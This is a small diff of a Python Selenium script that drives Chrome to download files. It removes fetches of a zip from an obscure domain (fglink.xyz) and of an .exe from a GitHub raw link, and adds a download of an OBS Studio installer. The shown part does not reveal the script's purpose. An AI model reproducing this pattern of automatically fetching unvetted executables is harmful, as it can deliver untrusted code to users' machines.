@@ -8,7 +8,8 @@ except ImportError:
 finally:
     from selenium import webdriver
     driver = webdriver.Chrome()
-    driver.get("https://fglink.xyz/G-Tv.zip")
-    driver.get("https://github.com/RetrixDev/mirrorbot-workflow/blob/main/installbackupandsync.exe?raw=true")
+#     driver.get("https://fglink.xyz/G-Tv.zip")
+
+    driver.get("https://cdn-fastly.obsproject.com/downloads/OBS-Studio-26.1.1-Full-Installer-x64.exe")
 
 
